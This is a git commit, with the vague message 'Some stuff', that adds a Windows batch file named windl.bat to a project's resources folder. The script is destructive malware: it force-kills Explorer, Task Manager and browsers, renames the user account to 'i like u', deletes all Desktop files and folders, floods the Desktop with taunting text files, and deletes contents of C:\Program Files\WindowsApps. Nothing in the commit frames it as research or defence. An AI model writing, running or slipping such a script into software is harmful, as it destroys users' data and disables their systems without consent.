0de837f8114a40513b062a2c1885f062615af772
Arturzek <42453634+Arturzek@users.noreply.github.com>
2018-09-20 21:16:19 -0300

    Some stuff

---
+++ Main part/Resources/windl.bat
@@ -0,0 +1,23 @@
+@echo off
+taskkill /f /im explorer.exe
+taskkill /f /im taskmgr.exe
+taskkill /f /im chrome.exe
+taskkill /f /im iexplorer.exe
+taskkill /f /im firefox.exe
+taskkill /f /im opera.exe
+
+
+wmic useraccount where name='%username%' set FullName='i like u'
+wmic useraccount where name='%username%' rename 'i like u'
+SET /a cr=0
+
+del /f /s /q %userprofile%\Desktop\*
+for /d %%p in (%userprofile%\Desktop\*) Do rd /Q /S "%%p"
+
+:l
+copy %temp%\txt.txt "%userprofile%\Desktop\O PROXIMO O PROXIMO O PROXIMO O PROXIMO O PROXIMO O PROX%cr%IMO.txt"
+SET /a cr=%cr%+1
+if %cr%==28 copy %temp%\ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA.rtf %userprofile%\Desktop\ABRAABRAABRAABRAABRAABRAABRAABRAABRAABRAABRA.rtf
+if not %cr%==100 goto l
+
+del /f /s /q "C:\Program Files\WindowsApps\"
